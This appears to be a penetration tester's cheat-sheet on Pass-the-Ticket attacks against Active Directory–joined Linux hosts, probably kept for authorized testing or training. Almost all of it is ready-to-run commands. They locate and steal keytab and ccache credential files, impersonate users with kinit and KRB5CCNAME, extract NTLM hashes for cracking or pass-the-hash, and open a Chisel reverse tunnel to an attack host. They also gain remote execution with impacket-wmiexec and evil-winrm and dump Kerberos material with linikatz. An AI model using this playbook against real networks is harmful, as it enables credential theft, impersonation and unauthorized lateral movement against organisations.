# Pass the Ticket (PtT) — Linux

## Identify Domain Join

```bash
realm list
ps -ef | grep -i "winbind\|sssd"
```

## Find Tickets

keytab files — check crontabs for scripts using `kinit`, need rw access to use:

```bash
find / -name *keytab* -ls 2>/dev/null
crontab -l
```

ccache files — check KRB5CCNAME env var, live tickets in /tmp:

```bash
env | grep -i krb5
ls -la /tmp | grep krb5cc
```

`/etc/krb5.keytab` = machine account ticket, root-only. If you have root → computer account impersonation.

## Abuse keytab — Impersonate via kinit

Check which user a keytab is for, then import:

```bash
klist -k -t <FILE>.keytab
kinit <USER>@<DOMAIN> -k -t <FILE>.keytab
klist
smbclient //<DC>/<SHARE> -k -c ls
```

Extract hashes from keytab for cracking or PTH:

```bash
python3 /opt/keytabextract.py <FILE>.keytab
```

Gives NTLM hash → PTH, or AES256 → Rubeus ticket forge. NTLM → hashcat mode 1000 or crackstation.net.

## Abuse ccache — Impersonate Active Session

Root required. Copy target's ccache and set env var:

```bash
cp /tmp/krb5cc_<ID> /root/
export KRB5CCNAME=/root/krb5cc_<ID>
klist
smbclient //<DC>/C$ -k -c ls -no-pass
```

Check target user's groups before impersonating — `id <USER>@<DOMAIN>`.

## Use Tickets from Attack Host (not domain-joined)

Hardcode domain IPs in /etc/hosts, set proxychains socks5 1080, tunnel via Chisel:

```bash
# attack host
sudo ./chisel server --reverse
# pivot host
chisel.exe client <ATTACK_IP>:8080 R:socks
export KRB5CCNAME=/path/to/krb5cc_<ID>
proxychains impacket-wmiexec dc01 -k -no-pass
proxychains evil-winrm -i dc01 -r <DOMAIN>
```

evil-winrm Kerberos requires `krb5-user` package + `/etc/krb5.conf` with correct realm and KDC set.

## Convert Ticket Formats

ccache (Linux) ↔ kirbi (Windows):

```bash
impacket-ticketConverter krb5cc_<ID> <USER>.kirbi
impacket-ticketConverter <USER>.kirbi krb5cc_out
```

kirbi → inject on Windows with `Rubeus.exe ptt /ticket:<FILE>.kirbi`

## Linikatz (root required — Linux Mimikatz)

Dumps all Kerberos material from SSSD, Samba, FreeIPA, keytabs, ccache files:

```bash
/opt/linikatz.sh
```

Output goes to `linikatz./` folder with ccache and keytab files ready to use.

> [!warning] ccache tickets expire — check `klist` valid/expires before using. Expired ticket = access denied with no clear error. Always verify expiry before chaining attacks off a stolen ccache.

> [!tip] Cronjob using `kinit` + keytab = the keytab path is right there in the script. Read it with `keytabextract.py`, get NTLM hash, PTH to whatever the service account can reach.